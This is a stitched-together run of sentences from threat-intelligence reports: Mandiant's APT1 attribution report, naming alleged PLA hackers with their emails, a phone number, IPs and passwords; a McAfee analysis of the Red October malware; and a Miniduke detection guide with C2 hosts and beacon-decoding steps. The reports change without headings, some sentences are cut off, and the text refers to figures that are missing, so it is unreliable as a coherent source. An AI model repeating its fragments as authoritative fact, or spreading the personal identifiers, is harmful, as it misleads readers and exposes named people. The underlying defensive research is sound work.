In the last three years we have observed APT1 FQDNs resolving to 988 unique IP addresses that we believe are not '' sinkhole '' or `` domain parking '' IP addresses : » » United States : 559 » » China : 263 » » Taiwan : 25 » » Korea : 22 » » United Kingdom : 14 » » Canada : 12 » » Other : 83 The vast majority of the Chinese IP addresses again belong to APT1 's home networks , meaning that in some instances APT1 intruders probably communicated directly to victim systems from their Shanghai systems , bypassing their hop infrastructure : These statistics indicate that there are over 400 IP addresses in the U.S. alone that may have active APT1 servers , which are as - yet unconfirmed by Mandiant .
Additionally , although we know of over 2,500 APT1 FQDNs , there are many APT1 FQDNs that we have not attributed to APT1 , which have resolved to even more IP addresses .
We estimate ( conservatively ) that APT1 's current hop infrastructure includes over 1,000 servers .
In our effort to underscore that there are actual individuals tasked by the PLA behind APT1 's keyboards , we have decided to expose the identities of a select number of APT1 personas .
These actors have made poor operational security choices , facilitating our research and allowing us to track their activities .
They are some of the authors of APT1 's digital weapons and the registrants of APT1 FQDNs and email accounts .
These actors have expressed interest in China 's cyber warfare efforts , disclosed their locations to be the Pudong New Area of Shanghai , and have even used a Shanghai mobile phone number to register email accounts used in spear phishing campaigns .
Methods for attributing APT personnel often involve the synthesis of many small pieces of information into a singular comprehensive picture .
Often this unified viewpoint reveals not only the group attribution , but coherent pockets of behavior within the group which we perceive to be either small teams or individual actors .
We refer to these as '' personas .
One additional element working in our favor as threat trackers is the Great Firewall of China ( GFWoC ) .
Like many Chinese hackers , APT1 attackers do not like to be constrained by the strict rules put in place by the Communist Party of China ( CPC ) , which deployed the GFWoC as a censorship measure to restrict access to web sites such as google .
Additionally , the nature of the hackers ' work requires them to have control of network infrastructure outside the GFWoC .
This creates a situation where the easiest way for them to log into Facebook and Twitter is directly from their attack infrastructure .
Once noticed , this is an effective way to discover their real identities .
What is the Great Firewall of China ? The `` Great Firewall '' is a term used to describe the various technical methods used by the Chinese government to censor and block or restrict access to Internet services and content that the government considers sensitive or inappropriate .
The `` Great Firewall '' uses methods such as blocking particular IP addresses ; blocking or redirecting specific domain names ; filtering or blocking any URL containing target keywords ; and rate - limiting or resetting TCP connections .
Chinese censors also routinely monitor Chinese websites , blogs , and social media for `` inappropriate '' content , removing it when found .
As a result , Chinese citizens who wish to access censored content must resort to workarounds such as the use of encryption .
China continues to improve and further restrict Internet access , most recently ( in December 2012 ) by blocking additional services and limiting or blocking the use of encryption technologies such as Virtual Private Networks .
The story of `` Ugly Gorilla '' ( UG ) dates back to 2004 .
A then - professor named Zhang Zhaozhong ( 张召 忠 ) , now a retired rear admiral , was in the process of helping to shape the future of China 's information warfare strategy .
Professor Zhang was already a strong advocate for the `` informationization '' of military units , and had published several works on military strategy including `` Network Warfare '' ( 网络战争 ) and '' Winning the Information War '' ( 打赢信息化战争 ) .
As Director of the `` Military Technology and Equipment '' ( 军事科技与装备 ) department at China 's National Defense University ( 国防大学 ) , professor Zhang was invited to take part in an event titled `` Outlook 2004 : The International Strategic Situation '' in January 2004 .
During the online question and answer session hosted by the PLA Daily 's ( 解放军报 ) China Military Online ( 中国军网 ) , one young man with the nickname '' Greenfield '' ( 绿野 ) posed a particularly prescient question .
It is said that the U.S. military has set up a dedicated network force referred to as a ' cyber army .
Thankfully , the Internet 's tendency to immortalize data preserved the profile details for us .
Thus , the persona we call `` UglyGorilla '' ( UG ) was first documented .
In addition to his email address , UG listed his `` real name '' as `` JackWang '' .
Within the year , we saw the first evidence of UG honing the tools of his trade .
On October 25 , 2004 , UG registered the now infamous `` hugesoft.org '' zone .
The `` hugesoft.org '' zone and its many APT1-attributed hostnames have remained active and under the continuous ownership of UG , and are still active as of the time of this report .
Registration information was most recently updated on September 10 , 2012 , extending the registration period for the zone well into 2013 .
We may see UG relinquish this and other attributed zones as a result of this reporting , in an effort to deter further tracking and attribution .
In 2007 , UG authored the first known sample of the MANITSME family of malware and , like a good artist , left his clearly identifiable signature in the code : `` v1.0 No Doubt to Hack You , Writed by UglyGorilla , 06/29/2007 '' [ sic ] .
For example , hostnames within other APT1-attributed FQDNs such as `` arrowservice.net '' and even the newer `` msnhome.org '' continue to leave UG 's imprint ( note the `` ug '' in the domains ) : » » ug-opm.hugesoft.org » » ug-rj.arrowservice.net » » ug-hst.msnhome.org Though these kinds of obvious attribution links tapered off as UG became more experienced , the protocol signatures of his tools such as MANITSME and WEBC2-UGX continue to be used by APT1 attackers based out of Shanghai .
In most instances , content such as hacking tools , information security topics , and association with the Shanghai locality are reasonable ways to eliminate false positives .
For example , in February of 2011 , the disclosure of all registered `` rootkit.com '' accounts published by Anonymous included the user '' uglygorilla '' with the registered email address uglygorilla @ 163.com .
This is the same email used to register for the 2004 PLA forum and the zone hugesoft.org .
Included in the rootkit.com leaked account information was the IP address 58.246.255.28 , which was used to register UG 's account directly from the previously discussed APT1 home range : 58.246.0.0/15 .
In a few of these accounts , UG has listed something other than `` JackWang '' as his real name .
On February 2 , 2006 , a user named `` uglygorilla '' uploaded a file named `` mailbomb_1.08.zip '' ( a bulk email tool ) to the Chinese developer site PUDN ( www.pudn.com ) .
His account details from PUDN included the real name `` Wang Dong '' ( 汪东 ) .
It is important to note two things at this point .
First , Chinese names begin with the surname .
So `` Wang '' is the last name in 汪东 .
Second , it is a fairly common practice for the Chinese , even in China , to choose an English first name .
Thus `` JackWang '' may not have been an alias at all .
Another APT1 persona is `` dota '' ( DOTA ) , named for his strong tendency to use variants of that name in almost all accounts he creates and uses from his attack infrastructure .
We have monitored the creation of dozens of accounts , including d0ta010 @ hotmail.com and dota.d013 @ gmail.com , and have often seen DOTA create several sequential accounts ( for example dota.d001 through dota.d015 ) at web- based email services .
Most often these accounts are used in social engineering and phishing attacks or as the contact email address when signing up for other services .
For example , DOTA ( originating from the APT1 home range IP address 58.247.26.59 ) with a Simplified Chinese keyboard setting used the email address `` d0ta001 @ hotmail.com '' from his US hop to register the Facebook user `` do.ta.5011 '' ( Facebook user i d : 100002184628208 ) .
Some services , such as Google 's Gmail , require users to provide a phone number during the registration process to which they send a validation `` text message '' containing a verification code .
The user must then input the verification code on the website to finalize registration .
In an observed session on a compromised machine , DOTA used the phone number `` 159 - 2193 - 7229 '' to receive a verification text message from Google , which he then submitted to their page within seconds .
Telephone numbers in China are organized into a hierarchy containing an area code , prefix , and line number similar to phone numbers in the United States , with the addition that a few area codes are allocated for use by mobile phone providers .
The phone number `` 159 - 2193 - 7229 '' breaks down into the `` 159 '' area code , which indicates a mobile phone provided by China Mobile , and the prefix `` 2193 '' , which indicates a Shanghai mobile number .
This means at the very least that the number was initially allocated by China Mobile for use in Shanghai .
The speed of DOTA 's response also indicates that he had the phone with him at the time .
We have also observed DOTA using the names Rodney and Raith to communicate via email in fluent English with various targets including South East Asian military organizations in Malaysia and the Philippines .
It is unclear if this Gmail account is used exclusively for facilitating his CNO mission , but much of the traffic indicates its use in both simple phishing attacks , as well as more sophisticated email based social engineering .
When creating dozens , or hundreds , of accounts in online communities and on victim systems , password management becomes a significant undertaking .
Consequently , most APT1 attackers use passwords that are either pattern - based , such as the keyboard pattern `` 1qaz2wsx '' or highly memorable , using `` rootkit '' as a password on the information security research site rootkit.com .
Like many APT1 attackers , DOTA frequently uses keyboard based patterns as passwords such as `` 1qaz @ WSX # EDC '' .
However , there is one password `` 2j3c1k '' extensively used by DOTA that is not based on a keyboard pattern , though he may not be the only APT1 actor that uses it .
A numbered `` j '' , followed by a numbered `` c '' , and then a numbered `` k '' is likely shorthand ( `` j '' / '' c '' / '' k '' ) for the ju / chu / ke ( 局／处／科 ) organizational structure ( translated to Bureau / Division ( or Office ) /Section ) widely used within PLA General Staff Department organizations .
Project 2049 describes the typical PLA organizational structure as , `` Bureau - level directors … oversee between six and 14 subordinate sites or offices [ chu ; 处 ] … Sites / offices under bureaus are further divided into sections [ ke ; 科 ] .
Given this pattern , it is likely that the password `` 2j3c1k '' stands for 2nd Bureau [ Unit 61398 ] , 3rd Division , 1st Section , demonstrating that those who use these patterns are working together and affiliate themselves to the 2nd Bureau .
Attempting to track the DOTA persona back to a particular individual is difficult ; the trail of his activity does not link as clearly to a real world identity .
However , Mandiant has been able to establish a clear link between UG and DOTA .
Specifically , we have observed the two using shared APT1 infrastructure , FQDNs , and egress IP address ranges .
The coordination of this shared infrastructure , combined with their close proximity and association with Unit 61398 makes it highly likely that , at the very least , UG and DOTA know each other personally and likely even work together .
Similarly to UG , SH signs much of his work by embedding strings within the tools .
In particular , elements of the portable executable ( PE ) file 's VS_VERSIONINFO structure are frequently set to '' SuperHard , '' or cmd.exe copies are modified from `` Microsoft corp . '' to `` superhard corp . '' Additionally , many of SH 's tools contain driver modules designed to be loaded into the Windows kernel in order to subvert elements of the system .
While not unique for APT1 coders , this level of development expertise is certainly a discriminator that puts SH into a smaller group of highly capable developers within APT1 .
Often , SH 's tools are observed in use by other APT1 personae and in several instances , other APT groups we track .
Given that SH 's tools are used by other APT1 actors , and that there are no indications that SH is a full - time operator , we believe that SH is primarily involved in research and development for APT1 .
Once again , in tracking SH we are fortunate to have access to the accounts disclosed from rootkit.com .
The rootkit .
We have observed the DOTA persona emailing someone with the username mei_qiang_82 .
The name `` Mei Qiang '' ( 梅强 ) is a reasonably common Chinese last / first name combination .
Additionally , it is a common practice for Chinese netizens to append the last two digits of their birth year , suggesting that SuperHard is in fact Mei Qiang and was born in 1982 .
Unfortunately , there are several '' Mei Qiang '' identities online that claim a birth year of 1982 , making attribution to an individual difficult .
Fortunately , we can use SH 's email address to connect him to a number of Websites and forums on which he registered and contributed using that address .
Many of these accounts reveal details that reinforce SH 's link to the '' mei_qiang_82 @ sohu.com '' email address and APT1 affiliation , such as SH offering to write Trojans for money , his involvement with malicious Windows kernel research ( incidentally , also commented on by `` greenfield '' , possibly UG ) , and more recently , being local to Shanghai 's Pudong New Area .
In a State that rigorously monitors Internet use , it is highly unlikely that the Chinese Government is unaware of an attack group that operates from the Pudong New Area of Shanghai .
The detection and awareness of APT1 is made even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this report .
Therefore the most probable conclusion is that APT1 is able to wage such a long - running and extensive cyber espionage campaign because it is acting with the full knowledge and cooperation of the government .
Given the mission , resourcing , and location of PLA Unit 61398 , we conclude that PLA Unit 61398 is APT1 .
Table 12 summarizes the parallels between APT1 and PLA Unit 61398 .
Combining our direct observations with carefully researched and correlated findings ; we believe the facts dictate only two possibilities : Either A secret , resourced organization full of mainland Chinese speakers with direct access to Shanghai - based telecommunications infrastructure is engaged in a multi - year , enterprise scale computer espionage campaign right outside of Unit 61398 's gates , performing tasks similar to Unit 61398 's known mission .
Or APT1 is Unit 61398 .
Mandiant uses the term threat group to refer to a collection of intruders who are working together to target and penetrate networks of interest .
These individuals may share the same set of tasks , coordinate their targets , and share tools and methodology .
They work together to gain access to their targets and steal data .
Therefore , a group is ultimately defined by people and not by methodology .
However , defining a threat group based on observed intrusion activity is not so simple .
Without seeing who is sitting behind the keyboard it may be difficult to determine whether two different intrusion events were conducted by the same person , by two people who are working together , by two unrelated people who independently compromised the same network , or even the same computer .
Different groups may use similar intrusion methodology and common tools , particularly those that are widely available on the Internet , such as pwdump , HTRAN , or Gh0st RAT .
Furthermore , there may be overlaps between groups caused by the sharing of malware or exploits they have authored , or even the sharing of personnel .
Individual intruders may move between groups either temporarily or permanently .
An intruder may be a private citizen who is hired by multiple groups .
Finally , multiple groups may work together on occasion to compromise the same target .
Nevertheless , distinguishing one threat group from another is possible with enough information , analytical experience , and the technological tools to piece it all together .
Consider an analogy with the physical world : imagine a thief who leaves behind traces of his crime at various crime scenes .
Individual robberies may vary in many details : » » The method the thief used to break in ; » » The tools used to open the safe ; » » Whether the thief carefully selected a particular item to steal , or took everything in the hope that he managed to grab something of value ; » » Whether the thief carefully researched their target , disabled alarms , and attempted to remove evidence such as fingerprints ; or whether he was not very careful , but simply relied on being `` stealthy enough '' to not get caught .
Forensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime scene was the result of one thief and not another .
In a similar way , cyber intruders leave behind various digital `` fingerprints .
Their emails may contain certain patterns of subject lines .
Their files have specific names , MD5 hashes , timestamps , custom functions , and encryption algorithms .
Their backdoors may have command and control IP addresses or domain names embedded .
These are just a few examples of the myriad of linkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another .
Digital `` fingerprints '' do not all carry equal weight in attribution analysis .
Their validity or value as indicators of a specific threat group depends largely on their likelihood of uniqueness .
For example , the use of a widely available tool such as HTRAN is not unique and not useful - by itself - as an indicator of a specific threat group .
In contrast , the use of a specific , custom backdoor not observed elsewhere is a much stronger indicator - although it is generally still not sufficient , on its own , for positive attribution .
At the most basic level , we say that two intrusion events are attributed to the same group when we have collected enough indicators to show beyond a reasonable doubt that the same person or group of people were involved .
While most computer intrusions follow a generic , high - level series of steps in the attack lifecycle , the Chinese APT lifecycle differs slightly because of their unique long - term objectives .
The sections below correspond to the stages of Mandiant 's Attack Lifecycle model and give an overview of what APT activity looks like in each stage .
The stages between `` Establish Foothold '' and `` Complete Mission '' do not have to occur in this order every time .
In fact , once established within a network , APT groups will continually repeat the cycle of conducting reconnaissance , identifying data of interest , moving laterally to access that data , and `` completing mission '' by stealing the data .
This will generally continue indefinitely until they are removed entirely from the network .
The Initial Compromise stage represents the methods that intruders use to penetrate a target organization 's network .
As such , the most commonly observed method of initial compromise is spear phishing .
Spear phishing messages may contain malicious attachments , a link to a malicious file , or a link to a malicious website .
Less commonly , APT intruders may attempt to contact potential victims and send malicious content via social networking sites or instant messaging .
Another common tactic is strategic web compromise , in which the attacker places malicious code on websites that people in targeted organizations will likely visit .
When they visit these websites in the course of their normal duties , they will be compromised if their computer is vulnerable to the attacker 's exploit code .
Establishing a foothold ensures that APT threat groups can access and control one or more computers within the victim organization from outside the network .
These backdoors usually establish an outbound connection from the victim network to a computer controlled by the attackers .
The communication methods used by the backdoors vary from clear text or simple encoding to the use of more advanced encoding or encryption .
The backdoors will give the APT groups basic access to a system , typically through a command shell or graphical user interface .
Escalating privileges involves acquiring items that will allow access to more resources within the victim environment .
Most often this consists of obtaining usernames and passwords , but it may also include gaining access to PKI certificates , VPN client software , privileged computers , or other resources required to access data or systems of interest .
This is typically accomplished by first `` dumping '' password hashes from a computer , server , or ( preferably ) Domain Controller .
The attacker may be able to obtain legitimate account passwords by `` cracking '' password hashes .
Alternately , the attacker may leverage the hashes themselves in a `` pass - the - hash '' attack , where the hashed password itself may be used for authentication in lieu of the actual password .
A number of publicly available tools can be readily leveraged for both password dumping and pass - the - hash attacks .
In the Internal Reconnaissance stage , the intruder collects information about the victim environment .
In order to identify data of interest , they may perform directory or network share listings , or search for data by file extension , key word , or last modified date .
Data of interest may take many forms , but most commonly consists of documents , the contents of user email accounts , or databases .
Therefore file servers , email servers , and domain controllers are customary targets of internal reconnaissance .
Some APT groups utilize custom scripts in order to automate the process of reconnaissance and identification of data of interest .
In most cases , the systems that the intruders initially compromise do not contain the data that they want .
Therefore they must move laterally within a network to other computers that either contain that data or allow them to access it .
They commonly use compromised credentials with PsExec and / or the Windows Task Scheduler ( `` at '' command ) to execute commands and install malware on remote systems .
In this stage , the intruders take actions to ensure continued control over key systems in the network environment from outside of the network .
They may install different families of malware on multiple computers and use a variety of command and control addresses , presumably for redundancy and to make it difficult to identify and remove all of their access points .
Additionally , APT groups may establish methods of network access that do not involve backdoors , so that they can maintain a presence even if network security personnel discover and remove their malware .
These methods may include the use of valid PKI or VPN credentials , allowing the intruders to masquerade as a legitimate user to gain access to a corporate network and internal resources .
In some instances APT threat actors have been able to circumvent two - factor authentication to maintain access to a victim network and its resources .
The main goal of APT intrusions is to steal data , including intellectual property , business contracts or negotiations , policy papers or internal memoranda .
Once APT groups find files of interest on compromised systems , they often pack them into archive files before stealing them .
They most commonly use the RAR archiving utility for this task , but may also use other publicly available utilities such as ZIP or 7-ZIP .
From there they use a variety of methods to transfer files out of the victim network , including FTP , custom file transfer tools , or existing backdoors .
This appendix is digital and can be found at http : //www.mandiant.com / apt1 .
It includes profiles of malware families that APT1 has used .
This appendix is digital and can be found accompanying this report .
It includes fully qualified domain names ( FQDNs ) that APT1 has used as part of their attack infrastructure .
This appendix is digital and can be found at http : //www.mandiant.com / apt1 .
It includes MD5 hashes of malware that APT1 has used as part of their attack methodology . In Appendix G : IOCs , the IOC named 8dd23e0a - a659 - 45b4-a168- 67e4b00944fb.ioc contains all of the MD5 hashes provided in this appendix for use in conjunction with Redline™ , Mandiant 's free host - based investigative tool , or with Mandiant Intelligent Response® ( MIR ) , Mandiant 's commercal host - based investigative tool .
This appendix is digital and can be found at http : //www.mandiant.com / apt1 .
It includes APT1 SSL certificates used on servers that are part of their command and control infrastructure .
The portion of this appendix that includes the Indicators of Compromise ( IOCs ) is digital and can be found at http : // www.mandiant.com/apt1 .
With the release of Mandiant 's report , APT1 : Exposing One of China 's Cyber Espionage Units , we are providing a set of APT1 IOCs in the digital portion of Appendix G to help detect malware described in Appendix C : The Malware Arsenal .
The IOCs included in Appendix G fit the latter ; however , keep in mind that APT1 does update their tools , and there are certainly malware variants and new families of malware that will not be detected with this set of IOCs .
To find out more about the report or the digital appendices ( to include downloading the set of APT1 IOCs in Appendix G : IOCs ) go to http : //www.mandiant .
Mandiant 's customers who have licensed MIR can simply import a zip file of the IOCs into their controllers .
For those without MIR , Redline can be downloaded from Mandiant 's web site at http : //www.mandiant.com / resources / download / redline .
Remember to always test new IOCs before using them in a production environment .
Mandiant has developed an open , extendable standard for defining and sharing threat information in a machine- readable format .
Going well beyond static signature analysis , IOCs combine over 500 types of forensic evidence with grouping and logical operators to provide advanced threat detection capability .
If you are not familiar with IOCs , go to the OpenIOC site for a description at http : //openioc.org .
Redline is Mandiant 's free tool for investigating hosts for signs of malicious activity through memory and file analysis , and subsequently developing a threat assessment profile .
Redline provides several benefits including the following : When confronted with a potentially compromised host , responders must first assess whether the system has active malware .
Without installing software or disrupting the current state of the host , Redline thoroughly audits all currently- running processes and drivers on the system for a quick analysis ; for a detailed analysis , it also collects the entire file structure , network state , and system memory .
Redline will also compare any MD5 value it collects , analyzes , and visualizes against an MD5 whitelist .
Users can further analyze and view imported audit data using Redline 's Timeline functionality , which includes capabilities to narrow and filter results around a given timeframe with the TimeWrinkles™ and TimeCrunches™ features .
The Redline Portable Agent can collect and analyze a complete memory image , working below the level at which kernel rootkits and other malware - hiding techniques operate .
Many hiding techniques become extremely obvious when examined at the physical memory level , making memory analysis a powerful tool for finding malware .
It also reveals '' memory only '' malware that is not present on disk .
Mandiant 's Redline tool streamlines memory analysis by providing a proven workflow for analyzing malware based on relative priority .
This takes the guesswork out of task and time allocation , allowing investigators to provide a focused response to the threats that matter most .
Redline calculates a `` Malware Risk Index '' that highlights processes more likely to be worth investigating , and encourages users to follow investigative steps that suggest how to start .
As users review more audits from clean and compromised systems , they build up the experience to recognize malicious activity more quickly .
As you investigate a system , here 's how Redline will help you focus your attention on the most productive data : Redline can collect a daunting amount of raw information .
Its investigative steps help provide a starting place by highlighting specific data and providing views that are most commonly productive in identifying malicious processes .
Unless you are pursuing a specific `` lead '' , we recommend working through the steps in order , examining the information for entries that do n't match your expectations .
The key to becoming an effective investigator is to review Redline data from a variety of `` clean '' and `` compromised '' systems .
Over time , your sense of which entries are normal and which are of concern will develop quickly as you view more data .
Redline analyzes each process and memory section using a variety of rules and techniques to calculate a `` Malware Risk Index '' for each process .
This score is a helpful guide to identifying those processes that are more likely to be worth investigating .
Processes at the highest risk of being compromised by malware are highlighted with a red badge .
Those with some risk factors have a grey badge , and low - risk processes have no badge .
The MRI is not an absolute indication of malware .
During an investigation you can refine the MRI scoring by adjusting specific hits ( identifying false positives and false negatives ) for each process , adding your own hits , and generally tuning the results .
Redline provides the option of performing IOC analysis in addition to MRI scoring .
Supplied a set of IOCs , the Redline Portable Agent will be automatically configured to gather the data required to perform a subsequent IOC analysis ; after the analysis is run , IOC hit results are available for further investigation .
In addition , Redline provides the ability to create an IOC Collector .
This feature enables the collection of data types required for matching a set of IOCs .
Combined with MIR , Redline is a powerful tool for accelerated live response .
Here 's a typical case : These IOCs are new ! However , much of the detection capability in this set of indicators has already been available to our MIR customers .
The IOCs may look different though as a result of improvements in creation and testing .
Mandiant started 2013 with a focus on taking better advantage of our threat intelligence .
We plan to continue to improve the synthesis of our threat intelligence and our IOCs by improving our breadth , IOC creation process , IOC management process , and IOC testing .
The majority of these indicators , or modified versions of them , will be integrated into the next IOC release .
We are using a new IOC designator in these IOCs called `` ( FAMILY ) .
We call those groupings of binaries `` families .
The new designator follows the family name in the `` Name '' field of the IOC , and the presence of ( FAMILY ) implies that that IOC applies to the whole family , not just one sample .
In many cases we have combined information that previously would have been in several indicators into a single indicator .
Additionally , we have removed certain types of intelligence , since they are being released in separate appendices ( such as FQDNs and IPs ) .
Additionally , some IOCs in this set are using file permutation blocks to catch variants of malware that might not be detected otherwise .
It is a different way to structure lists of File Item attributes to look for an entire family of malware versus only one or two pieces .
For more information on this topic or most any other IOC questions go to https : //forums.mandiant.com .
It is likely that we will make some changes to the IOCs in Appendix G as we get feedback .
If updated , the updates will be available in the same location as the report http : //www.mandiant.com / apt1 .
Currently , there are no plans for additional public releases of this magnitude .
This appendix is digital and can be found at http : //www.mandiant.com / apt1 .
It includes a compilation of videos showing actual attacker sessions and their intrusion activities .
The threats that were used in this attack campaign have been known to be active since 2009 .
This targeted attack involves both MS - office and Java based exploits .
The payloads used in the exploitation are mostly backdoors and password stealers that steal the user 's information and send it in an encrypted form to the remote attacker .
Detailed information about the infection , its propagation , and mitigation are in the following sections :  Infection and Propagation Vectors  Characteristics and Symptoms  Exploit HeatMap  Restart Mechanism  Getting Help from the McAfee Foundstone Services team The exploits used in the targeted attack are sent to the users through spear phishing e - mails that contain crafted malicious documents as attachments , and a malicious link embedded in the e - mail that leads to a compromised website .
Once the user opens the malicious document containing the embedded code , a malicious payload is dropped into the system .
The dropped payload in turn communicates with the C & C servers .
The payload receives additional modules from the C & C server to handle the infection on different types of devices and also could drop additional malware .
There could be different combinations of Microsoft and Java exploits and payload in the wild to achieve this attack .
We have used one of the MD5s ( 51EDEA56C1E83BCBC9F873168E2370AF ) to do this analysis , which is a document file .
The Red October campaign is known to target the following mentioned vulnerabilities :  CVE-2012 - 0158 ( MS Word )  CVE-2010 - 3333 ( MS Word )  CVE-2009 - 3129 ( MS Excel )  CVE-2011 - 3544 ( Java Rhino Script Engine Vulnerability ) The following picture clearly shows how the targeted attack happens in the Red October Campaign .
The phishing email contains an attachment with the malicious office document .
This file , when opened , exploits one of the above mentioned vulnerabilities and drops the payload file `` msmx21.exe '' .
After successful exploitation of the vulnerability , the embedded executable file ( msmx21.exe ) is dropped in the % temp % folder .
This might suggest that either the attack originates from Russia or was also targeted towards government agencies in Russia .
It connects to the following Microsoft hosts to check for a live Internet connection : update.microsoft.com www.microsoft.com support.microsoft.com wsdktr.ltp is an encrypted executable file ( UPX packed dll ) that is decrypted and loaded into memory by svchost.exe .
The decrypted file is responsible for the communication between the infected machine and C & C server as shown in the following image .
The following domains are used for C & C : nt-windows-online.com nt-windows-update.com nt-windows-check.com csrss-check-new.com In Java Rhino Script Engine Vulnerability , security manager is disabled during JavaScript execution , which would enable full permission to the system during its execution .
When the user clicks the link that came through the spam mail , the exploit would be triggered on the vulnerable system .
The downloaded payload creates and executes the following files : % Temp % \ tmp42e76b5f.bat - > random name % Application Data % \Keucot\ qagi.exe - > random name % Application Data % \ Okurp \ dezaa.ufy- > random name ( encrypted content ) The following debugged code shows the batch being created while execution .
The batch file has the following content : The payload injects itself to the running system processes in the machine .
They also monitor the browser activities in the targeted browsers ( Chrome , Firefox , Safari , and IE ) .
The above picture shows the changes made to the configuration file so that cookies wo n't be cleared when the user shuts down the system .
Also warning messages wo n't be displayed when the user visits the malicious or insecure pages .
Malicious threads injected to the processes monitor the user 's activities and collect the information about the Outlook contacts and browser cookies , along with the system information .
The collected information is stored as an encrypted content and sent to the command & control server .
Some of these exploits download Ransomware and Zbot payloads .
C & C Server : 29f2aad01fee3663.com McAfee has coverage for this exploit CVE-2011 - 3544 and detects the downloaded payload used in the targeted attack as BackDoor - FJJ .
The following statistics show the usage of the vulnerabilities in the targeted attack in the last quarter .
The following registry entry would enable the Trojan to execute every time when Windows starts .
Users are advised to update Windows and third - party application security patches and virus definitions on a regular basis and have proper filtering rules .
This document is intended to provide a summary of current intelligence and best practices to ensure the highest level of protection from your McAfee security solution .
The McAfee Foundstone Services team offers a full range of strategic and technical consulting services that can further help to ensure you identify security risk and build effective solutions to remediate security vulnerabilities .
Our participation in this research was justified by a detected Hungarian incident .
A detailed report on the results of our joint efforts has been published by Kaspersky Labs Securelist blog site ( see link below ) .
The Kaspersky Labs report describes what we currently know about the operation of Miniduke including its stages , and also information on the C & C infrastructure and communications .
In this report , we summarize the indicators of a Miniduke infection , and give specific hints on its detection .
The Kaspersky Labs report is available at https : //www.securelist.com / en / blog/208194129/The_MiniDuke_Mystery_PDF_0_day _ Government_Spy_Assembler_Micro_Backdoor The available malware samples are highly obfuscated , and compiled by a polymorphic compiler .
The attackers were able to produce new variants with only a few minutes difference between compile times .
Therefore the number of distinct samples could be very large .
These are typically 334093 byte long files with a 13-byte long gif header .
Below , we list the hashes of these files ; in case of the decrypted files with .gif_dec
Due to a large number of compiled samples , there is a high chance that the current version is difficult to detect by signatures .
Yet , there are common features in the samples that can be used to identify the malware components .
In every sample we checked , the `` Program Files / Startup '' contains a file with `` .lnk
This is used to start up the malware after the computer is rebooted .
An example of the lnk file created by the malware : The contents of the .lnk
The extension of the dll called is generally `` .tmp
The running copies of stage 1 and 2 appear as separated rundll.exe processes .
It is very useful to create a memory dump from these running processes , e.g. , by using SysInternals ProcessExplorer .
On the picture below , the export function name they use is GqOlls .
The names seem to follow a pattern : 6 chars long with two upper case letters .
A not fully cross - checked information is that during installation the malware will be copied in two copies to the system and the two executables differ .
This might mean that the executable modifies itself .
For example , we recovered the following two files : md5sum base.cat : 113e6fc85317fdd135e3f5f19e6c7a58 * base.cat md5sum ~6rld.tmp : c786a4cdfe08dbe7c64972a14669c4d1 * ~6rld.tmp where base.cat is the startup file , which is created based on ~6lrd.tmp .
As for stage 3 of the attack , it is important to note that it is not yet analyized deeply .
So once a victim downloads the ~300k long piece of code , we do n't know what happens with the previous stages , and we have no information about detections once this stage is reached , except the usage of the C & C server news.grouptumbler.com .
There are multiple layers of C & C communications in the malware .
First the malware uses Google search to receive information from its master .
Then , it uses the Twitter messaging service looking for the twits of a specific Twitter user .
Commands received via this channel trigger the download of stage 2 and stage 3 code from the C & C server .
We identified the following C & C servers delivering stage 2 and stage 3 codes : The C & C server used by stage 3 of the malware is news.grouptumbler.com and it is located in Panama .
At the time of this writing , port 80 seems to be closed on this server .
Address and open port information is below : Basic detection can be based on 3 queries that are initiated by the victim computers within seconds .
Known search strings in Google search ( see below ) can also be used to detect the malware .
Unfortunately , these strings are most likely unique to each C & C server or victim , thus unknown samples might use other strings , but possibly with the same length .
The malware also sends a query to the geoiptool .
An example is shown below : Initial communications with the stage 2/3 delivery C & C servers ( such as arabooks.ch ) can be used to develop detection signatures as follows : The malware retrieves the URL using a Twitter query as described earlier .
Then , we can observe the first query from the victim towards the stage 2/3 delivery C & C server .
This query contains pure HTTP traffic on port 80 to the server following the template below .
Based on this format , we can detect a valid query as follows : • The name of the 1st GET parameter should be discarded • this means `` e= '' is not important • we saw only one GET parameter , queries with multiple parameters are likely not used For detection , the Base64-like string `` aaa … '' should be first modified as follows : • `` - '' should be replaced by `` + '' • `` _ '' should be replaced by `` / '' This results in correct Base64 encoding , which can be decoded with library functions such as base64_decode .
After decoding , a string of data , partially binary will be available .
Parts are separated by the delimiter character `` | '' .
The format and a numerical example are below : < binary data ( ~100 bytes ) > | < numerical ID ( ~10 digits ) > | < version number > e.g. , < binary data > |5551115551|1.13 As the binary data itself may contain the `` | '' character , parsing should start from the end ( i.e. , the numerical ID starts from the second `` | '' character from the end ) .
In additional , the ID length may vary ( not fully confirmed ) , but it seems to be around 10 digits .
Finally , the version number always follows the pattern < 1digit > < dot > < two digits > , e.g. , 1.1X 3.1X .
The correct decoding of the HTTP query information should be enough to quickly develop possible IDS - based detections .
As we have seen , detection is complicated , but not impossible .
The following is the summary of potential detection steps : • Check if there is only one GET parameter • ( check if path is not empty and contains index.php ) ( possible , but not confirmed ) • convert the Base64-like GET parameter string into real Base64 encoding , and check if it decodes correctly • check if the decoded string has at least two delimieter character `` | '' in it • check if after the last but first `` | '' character , there are digits only • check if the version part of the string follows the format `` 1.11 '' or similar The header sent is fairly standard , but we include one example nonetheless : The used Agent strings vary significantly across queries , therefore they can not be really used for detection : The Google search step also uses different agent strings : The C & C server 's response – if it sends encrypted files – is a GIF file containing a small icon , and after that , the malware : For stage 3 ( i.e. , < i d > .gif
It also begins with a GIF header , but that header is only 13 bytes long , and then starts the encrypted executable , as shown below : Examples for twits containing the URL of the C & C server are shown below : The twitter information is currently not very useful for content based detection , as it is downloaded through SSL connection , and therefore , IDS rules can only be applied if some SSL proxy is used .
An interesting observation is that this user follows 4 partners , most likely for deception .
This piece of malware is made of three components : pdf , main , payload .
The PDF file embeds exploit code and a dropper that writes the `` main '' DLL component on the drive .
Additionally , the original PDF also contains a clean PDF file used in the social engineering stage .
As the malicious PDF file is opened , the Adobe process gets exploited , which results in running the dropper .
In turn , upon the dropper 's execution , the host process is killed and the clean PDF file gets displayed .
This trick allows the malware to run inconspicuously , without the user noticing that something has happened in the background .
The main DLL file is also loaded and runs in installation mode ( see the First Installation section ↓ ) .
Once installed , the malware calls back home using a URL found via Twitter or Google search query .
When successfully connected , new updates or payloads are installed under the disguise of .gif
There may be other infection mechanisms other than PDF files , but they remain unknown at the moment .
